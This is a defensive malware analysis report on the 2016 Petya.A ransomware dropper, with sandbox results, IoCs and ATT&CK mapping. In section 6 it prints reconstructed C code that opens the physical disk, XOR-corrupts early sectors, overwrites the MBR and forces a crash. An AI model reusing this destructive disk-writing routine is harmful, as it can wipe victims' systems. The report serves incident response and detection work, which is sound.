# Trojan-Ransom.Win32.Petr.a (Petya.A) — Detailed Analysis

Language: English | French version: [README.md](README.md)

**Sample (local file):** `Trojan-Ransom.Win32.Petr.a-26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739`  
**Family:** Petya / Petr.a (Windows dropper → MBR infection + MFT encryption) — **not** NotPetya (2017)  
**Historical detections:** Kaspersky `Trojan-Ransom.Win32.Petr.a`, Fortinet `W32/Petr.A!tr`  
**Any.RUN:** https://any.run/report/26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739/e8b1dea2-9916-4b00-a801-e9c6d5476d73  
**Task ID:** `e8b1dea2-9916-4b00-a801-e9c6d5476d73` (Win10 19044 x64, **660 s**, UAC autoconfirm **on**, 2026-08-20)  
**Sources:** PE + Hex-Rays 9.4 (`*.c`) + Any.RUN sandbox + public write-ups for **this** SHA256 (G DATA, Hasherezade / Malwarebytes, Check Point)

> **Defensive / IR analysis only.** The binary was **not** executed outside a third-party sandbox. The inner payload (`Setup.dll`) could **not** be recovered in cleartext statically (FUD cryptor).

---

## 0. Any.RUN summary ↔ code / architecture

### 0.1 Sandbox verdict (read carefully)

| Any.RUN field | Value |
|---------------|--------|
| UI verdict | **No threats detected** (classic false negative for this old MBR ransomware on Win10) |
| Tags / YARA | no ransomware tag shown |
| Monitored processes | **2** (same EXE) |
| Malware HTTP | **0** |
| Notable “drop” | `\\Device\Harddisk0\DR0` (low-level disk access) |

### 0.2 Observation ↔ code / literature

| Any.RUN observation | Confirmation |
|---------------------|--------------|
| UAC autoconfirm → PID **2936** **HIGH** integrity | Manifest `requireAdministrator`; Stage 1 needs admin for raw disk |
| PID **5560** MEDIUM, exit **3221226540** (`0xC0000409` STATUS_STACK_BUFFER_OVERRUN) | Second launch / unelevated failure or CRT abort — not the admin happy path |
| Access to `\\Device\Harddisk0\DR0` (PID 2936) | Stage 1 low-level write (= Win32 `\\.\PhysicalDrive0`) — **sandbox proof** of disk intent |
| DNS `google.com` (whitelisted) | Consistent with Omaha/CrashHandler look-alike stub; **not** ransom C2 |
| Remaining network = Microsoft update/activation | OS noise; ransomware is offline (TOR payment after Stage 2) |
| No fake CHKDSK / red screen / note | Stage 2 **not** observed on this Win10 VM (GPT/UEFI vs BIOS MBR, or partial unpack/crash) |
| Unchanged desktop + black screens | No Conti-like UI impact; possible reboot/BSOD attempt without full Petya boot |
| “Clean” verdict | **Do not** treat as benign: hash is documented Petya.A; Harddisk0 + admin is a strong signal |

### 0.3 Three-stage architecture (recap)

This SHA256 is the **Petya.A dropper** (G DATA cites `26b4699a…`). Statically the PE **hides** MBR/Salsa20 behind a **Google Crash Handler–like FUD** layer.

| Stage | Where | Role | Seen on Any.RUN? |
|-------|-------|------|------------------|
| **0 — FUD stub** | Local PE | CrashHandler look-alike + WinRAR SFX + admin | Yes (process, google.com, no MBR strings) |
| **1 — Setup.dll** | RAM | Keys + MBR/kernel write + `NtRaiseHardError` | **Partial:** `Harddisk0\DR0` under HIGH; no clear BSOD/CHKDSK |
| **2 — Boot / kernel** | 16-bit sectors | Fake CHKDSK → MFT Salsa20 → ransom | **No** on this run |

```
Email (CV / Dropbox) → PE32 (this file)
        │
        ▼  UAC (Any.RUN autoconfirm → HIGH)
   FUD stub (CrashHandler-looking)
        │  in-memory unpack
        ▼
   Setup.dll  ──► \\.\PhysicalDrive0 / Harddisk0\DR0
        │
        ▼  NtRaiseHardError → reboot (often incomplete on Win10 UEFI)
   Fake CHKDSK → Salsa20(MFT) → ransom  …  ← not observed here
```

---

## 1. Entry point — CRT → `wWinMain` (layer 0)

| PE field | Value |
|----------|--------|
| Type | PE32 GUI, Intel 80386 |
| ImageBase | `0x400000` |
| Entry Point RVA | `0x1716f` → VA `0x41716F` (typical MSVC CRT: `call` + `jmp` into runtime) |
| `wWinMain` | `0x401698` |
| TimeDateStamp | `0x5690F90F` → **2016-01-09 12:11:59 UTC** |
| Subsystem | 2 (WINDOWS_GUI) |
| Overlay | **none** (EOF = end of `.reloc`) |
| PDB (CodeView RSDS) | `GoogleCrashHandler_unsigned.pdb` (age 1) |

```c
// wWinMain @ 0x401698
int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                       LPWSTR lpCmdLine, int nShowCmd)
{
  HMODULE ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  // DLL hijack mitigation (Win8+): LOAD_LIBRARY_SEARCH_SYSTEM32 = 0x800
  auto SetDefaultDllDirectories =
      GetProcAddress(ModuleHandleW, "SetDefaultDllDirectories");
  if (SetDefaultDllDirectories)
    SetDefaultDllDirectories(2048);

  dword_437B60 = sub_404EEA();          // path / version-like init
  sub_401B2A(&dword_437E14, ...);
  sub_4026A4((bool *)&v12);             // SID / membership check
  if (result >= 0) {
    v9 = sub_4095D0(v14);               // build CrashHandler object
    return sub_4096DE((int)v9, v11);    // RunUntilShutdown-like
  }
  return result;
}
```

**Why this matters for IR**

- The EP is **not** a classic packer stub (immediate `VirtualAlloc`): it is a coherent MSVC Omaha-style binary.
- Hex-Rays therefore follows **Crash Handler** behavior, not MBR code — cross-check with Hasherezade (dynamic unpack → `Setup.dll`) is mandatory.

---

## 2. Layer-0 init — Google Update / Breakpad identity

### 2.1 Mutex and “Google” logging

```c
sub_406875(&v14, (int)L"_Google_Update_logging_mutex_", ...);
```

Other Unicode / registry artifacts (PE strings):

| Artifact | Value |
|----------|--------|
| Logging mutex | `_Google_Update_logging_mutex_` |
| Named pipe | `\\.\pipe\GoogleCrashServices` |
| Isolated desktop | `GoogleCrashHandlerWorkerDesktop` |
| Env | `CrashHandlerLaunchedForMinidump`, `GOOGLE_UPDATE_NO_CRASH_HANDLER` |
| Registry | `HKLM\Software\Google\Update\…`, `ClientState`, `Policies\Google\Update` |
| Files | `GoogleUpdate.exe`, `GoogleUpdate.ini`, `GoogleUpdate.log`, `Google\CrashReports` |

### 2.2 Isolated desktop — **why** (legitimate Breakpad pattern used as camouflage)

```c
DesktopW = CreateDesktopW(
    L"GoogleCrashHandlerWorkerDesktop",
    nullptr, nullptr, 0,
    0x10000000u,   // GENERIC_ALL
    nullptr);
SetThreadDesktop(DesktopW);
```

A real Crash Handler isolates workers on a dedicated desktop to limit UI impact of crashes. Here, these APIs plus Google naming strengthen the **FUD look-alike**: a quick scan sees “Google Update” strings and Breakpad flows (`MiniDumpWriteDump`, shellcode heuristics via `VirtualQueryEx`, etc.).

### 2.3 Token / SID check — `sub_4026A4`

Opens the process token, builds a SID, tests membership. Aligned with Stage 1’s need for **admin** (raw disk writes) — the manifest already forces UAC.

### 2.4 `sub_4096DE` flow

1. Reads env `CrashHandlerLaunchedForMinidump` — if set → short minidump path (`sub_40983B`).
2. Otherwise initializes the handler and calls `sub_411EC0` / `sub_4099E9` (`RunUntilShutdown` loop).

**Analysis limit:** the exact point where the cryptor switches to unpacking `Setup.dll` does **not** appear clearly in the decompilation (`VirtualAlloc` / `VirtualProtect` are imported, but no obvious direct calls in the `.c`). Consistent with FUD that muddies the CFG or loads the payload outside “clean” Hex-Rays paths.

---

## 3. Manifest & resources — social engineering

### 3.1 Manifest (`manifest.xml` extracted)

```xml
<assemblyIdentity version="1.0.0.0" name="WinRAR SFX" type="win32"/>
<description>WinRAR SFX module</description>
<requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
```

| Element | Effect |
|---------|--------|
| WinRAR SFX name / description | Frames the EXE as a “self-extracting archive” (CV / application pack) |
| `requireAdministrator` | UAC prompt — **no** bypass; relies on the user (Hasherezade / G DATA) |
| OS compat Vista→10 | Avoids compatibility warnings |

### 3.2 Resources

| Type | Detail |
|------|--------|
| `RT_ICON` / `GROUP_ICON` | 32×32 8 bpp → `icon_embedded.ico` |
| `RT_MANIFEST` | as above |
| Version info | **missing** (no `VS_VERSIONINFO`) |

---

## 4. Sections, entropy, suspicious blob

| Section | VA | Raw size | Characteristics | Entropy |
|---------|-----|----------|-----------------|---------|
| `.text` | `0x1000` | `0x27000` | CODE \| EXECUTE \| READ | **7.19** (high) |
| `.rdata` | `0x28000` | `0xC200` | INIT_DATA \| READ | 4.74 |
| `.data` | `0x35000` | `0x1A00` | INIT_DATA \| READ \| WRITE | 3.97 |
| `.rsrc` | `0x3A000` | `0x1200` | INIT_DATA \| READ | 5.53 |
| `.reloc` | `0x3C000` | `0x2400` | INIT_DATA \| READ \| DISCARDABLE | 6.59 |

Dense region in `.text` (file `0x24000`–`0x26800`, ~10 KiB, H ≈ **7.91**) dumped to:

`blob_0x24000_high_entropy.bin`  
SHA256: `1850b143444373795014b555bf47e593e877c525f95ea43ac77dc15f4835d09a`

- Header: repeating `87 C7 04 DE` (352 bytes) then pseudo-random data.
- Single-byte XOR (including `0x37`, used by Petya for MBR backup) does **not** reveal an embedded `MZ`/`PE`.
- No cleartext or trivial-XOR Petya strings (`PhysicalDrive`, `NtRaiseHardError`, `expand 32-byte k`, `.onion`, `CHKDSK`) in the whole PE.

**Conclusion:** blob is a candidate encrypted payload / FUD tables, **not** decryptable offline with the trivial methods tested.

---

## 5. Notable imports (layer 0)

No crypto imports such as `CryptGenRandom` / `CryptEncrypt` in **this** PE (Stage 1 crypto lives in `Setup.dll`).

| DLL | Relevant APIs | Defensive reading |
|-----|---------------|-------------------|
| KERNEL32 | `CreateFileW`, `WriteFile`, `DeviceIoControl`, `VirtualAlloc`, `VirtualProtect`, `CreateProcessW`, `CreateThread`, `CreateNamedPipeW`, `DebugActiveProcess`, `ReadProcessMemory`, `IsDebuggerPresent` | I/O + unpack / Breakpad debug capabilities |
| ADVAPI32 | Token / SID / Registry / ETW tracing | Privileges + Google Update config |
| USER32 | `CreateDesktopW`, `SetThreadDesktop`, `MessageBoxW`, clipboard | Isolated desktop + UI |
| SHELL32 | `SHGetFolderPathW` | Profile paths |
| VERSION | `GetFileVersionInfo*` | Module versioning |
| NETAPI32 | `NetWkstaGetInfo` | Machine info |
| — | `dbghelp!MiniDumpWriteDump` (dynamic) | Crash Handler minidumps |

`DeviceIoControl(0x170002)` appears in NIC fingerprinting (`\\.\%s`) — Breakpad-style, **not** Petya disk IOCTLs.

---

## 6. Stage 1 — `Setup.dll` and writing to `\\.\PhysicalDrive0`

> **Code provenance:** the Hex-Rays decompilation of the local **FUD stub** (`*.c`) does **not** contain `PhysicalDrive` / sector loops — that logic lives in the unpacked **`Setup.dll`** payload (MD5 `7899d609…`).  
> The reconstruction below follows public RE of **this** hash / campaign (Hasherezade, Securelist/Kaspersky, Check Point, Infosec Institute, DefCamp slides) plus the Any.RUN artifact `\\Device\Harddisk0\DR0`.

Sources: Hasherezade (Malwarebytes 2016-04), G DATA, Check Point, Securelist “Petya the two-in-one trojan”, Infosec Institute Part II.

### 6.1 Unpack (recap)

1. FUD stub allocates / maps a PE into contiguous memory.
2. RVAs are treated as raw offsets (flattened PE) — naive dumps often invalid.
3. If captured before destruction: DLL **`Setup.dll`**, one export (`_ZuWQdweafdsg345312@0`), crypto via **mbedTLS / PolarSSL**, MD5 `7899d6090efae964024e11f6586a69ce`.

### 6.2 Why `\\.\PhysicalDrive0` — and the Any.RUN equivalent

| Path | Layer | Role |
|------|-------|------|
| `\\.\PhysicalDrive0` | Win32 (userland) | Handle to the **entire disk** (not `C:`), allowing 512-byte **sector** R/W from offset 0 (MBR) |
| `\\Device\Harddisk0\DR0` | NT native (Any.RUN) | Same kernel object: Harddisk0, raw disk DR0 |

**Why not `C:`?**  
Writes to `C:\` go through NTFS — you cannot overwrite the MBR / pre-partition sectors that way. `PhysicalDriveN` talks to the **storage stack** (DISK class): `CreateFile` + `SetFilePointerEx` + `ReadFile`/`WriteFile` operate in sector-size multiples.

**Prerequisite:** admin token (Any.RUN: PID 2936 **HIGH** after UAC autoconfirm). Without it, `CreateFile` fails → later variants fall back to Mischa; here the MEDIUM run (PID 5560, exit `0xC0000409`) is **not** the disk happy path.

```
                    ┌── CreateFile("\\\\.\\PhysicalDrive0", ...)
Userland Setup.dll ─┤── DeviceIoControl (geometry / partition style)
                    ├── loop Read → XOR 0x37 → Write (backup)
                    ├── Write bootloader @ sector 0
                    ├── Write kernel @ sectors 34+
                    ├── Write config / verify @ 54–56
                    └── NtRaiseHardError → BSOD
                              │
Any.RUN files activity ───────┴── \\Device\Harddisk0\DR0  (PID 2936)
```

### 6.3 Opening the disk — APIs and flags (reconstruction)

Hasherezade: **DeviceIoControl** is mainly used to **query** disk/partitions; the MBR infection itself uses **`WriteFile`** (not a dedicated “wipe” IOCTL).

Defensive pseudocode aligned with 2016 RE:

```c
// Setup.dll — open system physical disk (annotated reconstruction)
// Requires: admin + (ideally) volume not exclusively locked

HANDLE OpenPhysicalDrive0(void)
{
  // Win32 path to the first physical disk
  // (Check Point: sometimes derived from the system volume → PhysicalDriveN)
  HANDLE hDisk = CreateFileA(
      "\\\\.\\PhysicalDrive0",
      GENERIC_READ | GENERIC_WRITE,   // read MBR + write infection
      FILE_SHARE_READ | FILE_SHARE_WRITE,
      NULL,
      OPEN_EXISTING,                  // device must already exist
      FILE_FLAG_NO_BUFFERING |        // sector-aligned I/O (often required)
      FILE_FLAG_WRITE_THROUGH,        // low-level flush
      NULL);

  if (hDisk == INVALID_HANDLE_VALUE) {
    // → no MBR infection (rights / lock / policy)
    return INVALID_HANDLE_VALUE;
  }
  return hDisk;
}
```

**Why `FILE_FLAG_NO_BUFFERING`**

- Reads/writes must be **multiples of the sector size** (512 or 4096).
- Avoids the Windows file cache delaying / transforming writes on a non-file object.

### 6.4 Partition discovery — `DeviceIoControl`

Before writing, `Setup.dll` queries the partition style:

```c
// IOCTL_DISK_GET_PARTITION_INFO_EX = CTL_CODE(IOCTL_DISK_BASE, 0x0012, ...)
PARTITION_INFORMATION_EX partInfo;
DWORD br;

BOOL ok = DeviceIoControl(
    hDisk,
    IOCTL_DISK_GET_PARTITION_INFO_EX,
    NULL, 0,
    &partInfo, sizeof(partInfo),
    &br, NULL);

// Check Point: continues for PARTITION_STYLE_MBR **or** PARTITION_STYLE_GPT
// (classic MBR infection mainly targets MBR layout;
//  on modern GPT/UEFI boot impact may fail — consistent with Any.RUN Win10)
```

G DATA / Securelist: **only the system disk** (the Windows disk) is targeted — not every `PhysicalDriveN`.

Any.RUN (Breakpad stub, **other** IOCTL): the local `.c` shows `DeviceIoControl(..., 0x170002, ...)` on `\\.\%s` for **NICs** — **do not** confuse with `Setup.dll` disk IOCTLs.

### 6.5 Crypto generation **before** the writes (deliberate order)

```c
// CryptGenRandom (Windows CAPI) — Hasherezade
BYTE rnd[128];
CryptGenRandom(hProv, sizeof(rnd), rnd);

// Typical derivatives later stored in the config sector (54):
//  - 32-byte Salsa20 key (or 16-byte expanded → 32)
//  - 8-byte nonce / IV
//  - material for victim ID (ECC / ECIES → "personal decryption code")
//  - onion addresses built from the random bytes
```

**Why before WriteFile:** after BSOD/reboot, userland is gone. The key and ID must already be **on disk** (sector 54 / onion structures) for the 16-bit kernel and the ransom screen.

### 6.6 “Read → XOR `0x37` → Write” loop — destructive backup

Constants (Securelist / Infosec; sector = **512** bytes):

| Sector | Content after infection |
|--------|-------------------------|
| **0** | Petya first-level bootloader — **overwrites** the Windows MBR |
| **1–33** | Former sectors 1–33, each **XOR `0x37`** (`'7'`) |
| **34–50** (approx.) | Second-level kernel / loader (~32 sectors total with data) |
| **54** | Config (key, nonce, “already encrypted” flag, etc.) |
| **55** | **Verification** sector filled with `0x37` |
| **56** | **Original MBR** XOR `0x37` (backup for restore if the key is correct) |

```c
// Reconstruction of the sector 1..33 loop (DefCamp / Infosec)
// Repeated pattern: CreateFile / SetFilePointerEx / ReadFile /
//                   XOR 0x37 / SetFilePointerEx / WriteFile

#define SECTOR 512
#define XOR_KEY 0x37u

static void xor_buf(BYTE *buf, DWORD len, BYTE key)
{
  for (DWORD i = 0; i < len; i++)
    buf[i] ^= key;
}

// Backup + trivial “encryption” of sectors 1 → 33
for (DWORD sec = 1; sec <= 33; sec++) {
  BYTE buf[SECTOR];
  DWORD rd = 0, wr = 0;
  LARGE_INTEGER off;
  off.QuadPart = (LONGLONG)sec * SECTOR;

  SetFilePointerEx(hDisk, off, NULL, FILE_BEGIN);
  ReadFile(hDisk, buf, SECTOR, &rd, NULL);   // read clean sector

  xor_buf(buf, SECTOR, XOR_KEY);             // XOR 0x37

  SetFilePointerEx(hDisk, off, NULL, FILE_BEGIN);
  WriteFile(hDisk, buf, SECTOR, &wr, NULL);  // write back in place
}

// Sector 0 (MBR): XOR → copy to sector 56, then overwrite @ 0
BYTE mbr[SECTOR];
LARGE_INTEGER z = {0};
SetFilePointerEx(hDisk, z, NULL, FILE_BEGIN);
ReadFile(hDisk, mbr, SECTOR, &rd, NULL);

BYTE mbr_bak[SECTOR];
memcpy(mbr_bak, mbr, SECTOR);
xor_buf(mbr_bak, SECTOR, XOR_KEY);

LARGE_INTEGER off56;
off56.QuadPart = 56LL * SECTOR;
SetFilePointerEx(hDisk, off56, NULL, FILE_BEGIN);
WriteFile(hDisk, mbr_bak, SECTOR, &wr, NULL);  // backup @ 56

// Keep NT disk signature + partition table from the original MBR
// (offsets ~0x1B8..0x1FF) inside the new bootloader — Securelist
// then:
SetFilePointerEx(hDisk, z, NULL, FILE_BEGIN);
WriteFile(hDisk, petya_mbr_template, SECTOR, &wr, NULL); // malicious MBR
```

**Why XOR `0x37` instead of real crypto here?**

1. **Speed** in userland before BSOD.
2. **Reversibility:** if the victim pays / supplies the correct Salsa20 key, the bootloader can restore the MBR from sector 56 (`buf[i] ^= 0x37` again).
3. **Anti-naive recovery:** `fixmbr` alone is not enough — following sectors are altered too; the MFT is encrypted at Stage 2.

### 6.7 Writing the kernel @ sector 34+

```c
// Hasherezade: kernel starts @ 0x4400 (= sector 34 * 512)
// Typical length: ~32 sectors (bootloader loads 32 sectors → 0x8000)

LARGE_INTEGER off34;
off34.QuadPart = 34LL * SECTOR;   // 0x4400
SetFilePointerEx(hDisk, off34, NULL, FILE_BEGIN);
WriteFile(hDisk, petya_kernel_blob, kernel_size /* ~32*512 */, &wr, NULL);

// Sector 54: configuration (Salsa20 key, nonce, encryption flag=0, onion…)
// Sector 55: memset(buf, 0x37, 512) — verification buffer after payment
```

The bootloader (sector 0) loads this blob in 16-bit real mode, then the “fake CHKDSK” encrypts the **MFT** with Salsa20 (Stage 2 — outside this section).

### 6.8 Forced crash — `NtRaiseHardError` (after the writes)

**Critical order:** all disk writes finish **before** the BSOD. Otherwise Stage 2 has neither key nor bootloader.

```c
// Shutdown privilege
HANDLE hToken;
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
// LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid);
// AdjustTokenPrivileges(... SeShutdownPrivilege ...);

// Also documented via RtlAdjustPrivilege(19) = SE_SHUTDOWN_PRIVILEGE
typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
    NTSTATUS ErrorStatus, ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask, PULONG_PTR Parameters,
    ULONG ValidResponseOptions, PULONG Response);

HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
NtRaiseHardError_t NtRaiseHardError =
    (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");

ULONG resp = 0;
// STATUS_HOST_DOWN = 0xC0000350 ; OptionShutdownSystem = 6
NtRaiseHardError(0xC0000350, 0, 0, NULL, 6, &resp);
// → BSOD → reboot → new MBR executes
```

### 6.9 Any.RUN link (this sample, task `e8b1dea2-…`)

| Sandbox fact | Interpretation |
|--------------|----------------|
| Files activity: `\\Device\Harddisk0\DR0` under PID **2936** | Raw disk handle / I/O — **same intent** as `CreateFile("\\\\.\\PhysicalDrive0")` |
| Integrity **HIGH** | Necessary condition for the writes |
| No fake CHKDSK / red screen | Writes possibly partial **or** MBR written but UEFI/GPT boot ignores 16-bit code → Stage 2 UI missing |
| Verdict “No threats detected” | Any.RUN signatures did not classify Harddisk0 I/O as ransomware — **false negative** |

### 6.10 IR window / detection

| Moment | Disk state | Defensive action |
|--------|------------|------------------|
| During / right after `WriteFile`, **before** BSOD | MBR already dirty, MFT still OK | **Do not reboot**; `dd` the disk; offline mount |
| After BSOD + fake CHKDSK | MFT Salsa20-encrypted | Version-specific key recovery / decryptor |
| Runtime IOC | `CreateFile` on `\\.\PhysicalDrive0` + 512-byte `WriteFile` + `NtRaiseHardError` | EDR / Sysmon rule (raw disk access from atypical user process) |

**EDR sketch (detection idea, not an evasion aid):**

```
DeviceImage = *\PhysicalDrive0
AND CreateFile access = Write
AND process NOT IN (signed storage vendors, disk tools)
→ alert + suspend (especially if followed by NtRaiseHardError)
```

---

## 7. Stage 2 — bootloader + kernel (16-bit)

1. Boot → loads kernel (sector 34).
2. Sector 54 flag: if not encrypted → **fake CHKDSK** (Salsa20 MFT encryption); else red screen.
3. After encryption, the cleartext Salsa20 key is **wiped** from the sector.
4. Note: ASCII skull art, TOR URLs, Bitcoin demand, key entry (16+ chars, custom charset).

Kernel crypto: Salsa20 (fragile 16-bit implementation — vulnerabilities documented by Check Point / leo-stone; public decryptors for **older** Janus versions).

**Out of scope — NotPetya:** no EternalBlue, no Mimikatz, no LAN worm — 2016 email campaign.

---

## 8. Encryption model (impact)

| Layer | Target | Primitive | Recovery |
|-------|--------|-----------|----------|
| Stub | — | FUD (opaque here) | N/A |
| Setup.dll | MBR + disk metadata | ECC wrap of session key | Tor panel identifier |
| Kernel | **NTFS MFT** (not every file) | Salsa20-256 + nonce | 16-char key validated against sector 55 buffer |

Files often remain present in raw form; without the MFT the volume is unusable — hence the misleading “full disk encryption” wording in the note.

---

## 9. Cleanup / anti-recovery

| Action | Stage | Effect |
|--------|-------|--------|
| MBR overwrite | 1 | Windows will not boot without restore |
| XOR 0x37 backup | 1 | MBR recoverable if dump pre-Stage 2 |
| Salsa20 key wipe | 2 | After fake CHKDSK, clear key is gone |
| No HTTP C2 | 1–2 | Payment via TOR only |
| No classic userland VSS wipe | — | Impact = MFT + boot, not Conti-like `vssadmin` |

---

## 10. Timeline (typical infection)

| T | Event |
|---|-------|
| T0 | Open “CV” / SFX → admin UAC |
| T0+ | CrashHandler-like stub runs; unpacks `Setup.dll` |
| T1 | Writes MBR + kernel; `NtRaiseHardError` |
| T2 | Reboot → fake CHKDSK (MFT encryption) |
| T3 | Further reboot → ransom screen TOR/Bitcoin |
| Tsalvage | Between T1 and T2: disk dump still recoverable |

---

## 11. IoCs

### 11.1 Analyzed file (layer 0)

```
MD5     af2379cc4d607a45ac44d62135fb7015
SHA1    39b6d40906c7f7f080e6befa93324dddadcbd9fa
SHA256  26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739
Size    230912
PDB     GoogleCrashHandler_unsigned.pdb
Compile 2016-01-09 12:11:59 UTC
```

### 11.2 Stub strings / runtime artifacts + sandbox

```
Mutex     _Google_Update_logging_mutex_
Pipe      \\.\pipe\GoogleCrashServices
Desktop   GoogleCrashHandlerWorkerDesktop
Manifest  WinRAR SFX + requireAdministrator
Any.RUN   \\Device\Harddisk0\DR0   (PID 2936, HIGH)
Any.RUN   exit 3221226540 (PID 5560, MEDIUM)
Task      e8b1dea2-9916-4b00-a801-e9c6d5476d73
```

### 11.3 Related payload / campaign (literature, same family)

```
Setup.dll MD5     7899d6090efae964024e11f6586a69ce
Setup.dll SHA256  542a38bf52afa6a4a008089a6fbf22c9d68ef5d6c634dd2c0773d859a8ae2bbf
Kernel dump MD5   d80fc07cc293bcd36e630d45a34aca11
MBR backup XOR    0x37
Disk device       \\.\PhysicalDrive0
```

### 11.4 TOR / contact (historical Petya / Mischa network IoCs)

```
hxxp://petya3jxfp2f7g3i[.]onion/
hxxp://petya3sen7dyko2n[.]onion/
hxxp://mischapuk6hyrn72[.]onion/
hxxp://mischa5xyix2mrhd[.]onion/
```

(Later GoldenEye / Mischa variants add other paths — validate against the displayed note.)

### 11.5 Local undecrypted blob

```
blob_0x24000_high_entropy.bin
SHA256  1850b143444373795014b555bf47e593e877c525f95ea43ac77dc15f4835d09a
Offset  file 0x24000 (inside .text)
```

---

## 12. Any.RUN screenshots (after triage)

Local folder: `anyrun_screenshots/` — **3 JPEGs** kept (1360×768) + `README_captures.md`.

| # | File | Content | Role in the report |
|---|------|---------|-------------------|
| 01 | `screen_01_ea921e89-72e3-48b9-9dad-30e942b59240.jpg` | Unchanged Win10 Any.RUN desktop (no encrypted icons / no note) | Shows **Stage 2 UI** did not occur on this run |
| 03 | `screen_03_ff308157-303b-4459-9b63-ca693a8d884a.jpg` | Full black screen | Display cut (reboot / session) — **not** the 2016 fake CHKDSK |
| 06 | `screen_06_fef71e22-a773-47c5-a1fb-ac078b0abb07.jpg` | Black screen | Same family; desktop duplicates 02/04/05 discarded |

```
anyrun_screenshots/
├── README_captures.md
├── screen_01_ea921e89-72e3-48b9-9dad-30e942b59240.jpg   ← desktop
├── screen_03_ff308157-303b-4459-9b63-ca693a8d884a.jpg   ← black
└── screen_06_fef71e22-a773-47c5-a1fb-ac078b0abb07.jpg   ← black
```

---

## 13. ATT&CK

| Technique | ID | Evidence |
|-----------|-----|----------|
| User Execution | T1204.002 | CV email / Dropbox → EXE; Any.RUN parent `explorer.exe` |
| Abuse Elevation Control (UAC) | T1548.002 | Admin manifest + Any.RUN HIGH integrity (PID 2936) |
| Masquerading | T1036 | WinRAR SFX + Google Crash Handler naming |
| Obfuscated Files or Information | T1027 | FUD cryptor; payload not clear |
| Native API | T1106 | `NtRaiseHardError` (Stage 1, literature) |
| Disk Structure Wipe / bootkit | T1561.002 / T1542.003 | MBR (literature); Any.RUN `Harddisk0\DR0` |
| Data Encrypted for Impact | T1486 | MFT Salsa20 (literature; **not** seen in sandbox UI) |
| Inhibit System Recovery | T1490 | Boot + MFT if Stage 2 completes |
| System Shutdown/Reboot | T1529 | Forced BSOD (literature); sandbox black screens |
| Application Layer Protocol (Tor) | T1071 | Onion panel (outside stub; outside this run) |

---

## 14. Files produced in this folder

```
anyrun_screenshots/
  README_captures.md
  screen_01_ea921e89-72e3-48b9-9dad-30e942b59240.jpg
  screen_03_ff308157-303b-4459-9b63-ca693a8d884a.jpg
  screen_06_fef71e22-a773-47c5-a1fb-ac078b0abb07.jpg
Trojan-Ransom.Win32.Petr.a-26b4699a…          ← PE sample
Trojan-Ransom.Win32.Petr.a-26b4699a….c        ← Hex-Rays 9.4
manifest.xml                                 ← extracted RT_MANIFEST
icon_embedded.ico                            ← resource icon
blob_0x24000_high_entropy.bin                ← high-entropy .text region
README.md                                    ← French
README_EN.md                                 ← this document
```

**Not produced (reasons):** cleartext `Setup.dll`, ransom note from the PE, Conti-style RSA overlay, `vssadmin` scripts — absent from this layer / not decrypted statically / not dropped on this Any.RUN run.

---

## 15. Limits & recommended next steps

1. **No local execution** outside a third-party sandbox (destructive to the disk).
2. Any.RUN Win10 19044: **partial** detonation (Harddisk0 yes, Stage 2 UI no). For full Stage 2, use a **BIOS/MBR** VM closer to 2016, or offline-analyze a disk dump right after `Harddisk0\DR0`.
3. Unpack `Setup.dll`: timely memory dump (Hasherezade method).
4. Do not confuse with **NotPetya** (`71b6a493…` etc.).
5. Public decryptors (leo-stone, Janus keys 2017): older variants only.

---

*End of report.*
